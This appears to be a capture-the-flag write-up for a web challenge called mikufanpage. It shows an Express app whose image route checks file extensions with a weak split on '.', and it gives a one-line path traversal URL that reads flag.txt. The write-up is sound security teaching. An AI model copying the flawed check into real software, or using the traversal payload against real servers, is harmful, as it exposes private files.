## web/mikufanpage
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/c3380736-c789-4c58-b3b0-b7bb7918dd0b)
### app.js
```
const express = require('express'); 
const path = require('path');
  
const app = express(); 
const PORT = process.env.PORT ?? 3000;

app.use(express.static(path.join(__dirname, 'public')));
  
app.listen(PORT, (err) =>{ 
    if(!err) 
        console.log("mikufanpage running on port "+ PORT) 
    else 
        console.log("Err ", err); 
}); 

app.get("/image", (req, res) => {
    if (req.query.path.split(".")[1] === "png" || req.query.path.split(".")[1] === "jpg") { // only allow images
        res.sendFile(path.resolve('./img/' + req.query.path));
    } else {
        res.status(403).send('Access Denied');
    }
});
```
- we see it just splits by . and checks the second parms is png or jpg which is clearly a weak check
- we do see the structure of source code
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/8133227a-0618-43b6-9a5a-1ef000b4234f)
- so all we need to do is just get the flag file
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/38f4b6a0-8276-4dd3-b53a-e929be09f1ab)
```
view-source:https://mikufanpage.web.osugaming.lol/image?path=miku5.jpg./../flag.txt
```
